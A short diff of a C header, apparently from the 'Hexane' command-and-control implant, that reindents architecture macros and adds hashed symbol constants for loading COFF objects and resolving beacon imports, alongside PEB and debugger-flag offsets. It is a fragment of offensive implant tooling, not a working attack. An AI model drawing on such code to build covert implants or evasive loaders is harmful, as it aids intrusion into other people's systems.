@@ -66,21 +66,31 @@ EXTERN_C LPVOID InstEnd();
 #define IMAGE_REL_TYPE(x, y)  					IMAGE_REL_##x##_##y
 
 #ifdef _M_X64
-#define ENTRYPOINT_REG 							Rcx
-#define PTR_MASK                                0x7FFFFFFF
-#define PEB_POINTER     						PEB_POINTER64
-#define REG_PEB_OFFSET(x) 						REG_PEB64(x)
-#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET64
-#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR64_MAGIC
-#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_AMD64
+	#define ENTRYPOINT_REG 						Rcx
+	#define PTR_MASK                    		0x7FFFFFFF
+	#define PEB_POINTER     					PEB_POINTER64
+	#define REG_PEB_OFFSET(x) 					REG_PEB64(x)
+	#define DBG_FLAG_OFFSET 					DBG_FLAG_OFFSET64
+	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR64_MAGIC
+	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_AMD64
+	#define COFF_PREP_SYMBOL        			0xec6ba2a8 	// __imp_
+	#define COFF_PREP_SYMBOL_SIZE   			6
+	#define COFF_PREP_BEACON        			0xd0a409b0  // __imp_Hexane
+	#define COFF_PREP_BEACON_SIZE   			(COFF_PREP_SYMBOL_SIZE + 6)
+	#define COFF_INSTANCE           			0xbfded9c9  // .refptr._instance
 #elif _M_IX86
-#define ENTRYPOINT_REG 							Eax
-#define PTR_MASK                                0x7FFF
-#define PEB_POINTER     						PEB_POINTER32
-#define REG_PEB_OFFSET(x) 						REB_PEB32(x)
-#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET32
-#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR32_MAGIC
-#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_I386
+	#define ENTRYPOINT_REG 						Eax
+	#define PTR_MASK                    		0x7FFF
+	#define PEB_POINTER     					PEB_POINTER32
+	#define REG_PEB_OFFSET(x) 					REB_PEB32(x)
+	#define DBG_FLAG_OFFSET 					DBG_FLAG_OFFSET32
+	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR32_MAGIC
+	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_I386
+    #define COFF_PREP_SYMBOL        			0x79dff807	// __imp__
+    #define COFF_PREP_SYMBOL_SIZE   			7
+    #define COFF_PREP_BEACON        			0x4c20aa4f	// __imp__Hexane
+    #define COFF_PREP_BEACON_SIZE   			(COFF_PREP_SYMBOL_SIZE + 6)
+    #define COFF_INSTANCE           			0xb341b5b9	// _instance
 #endif
 
 #define HEAP_NO_COMMIT							0, 0, 0, 0, 0
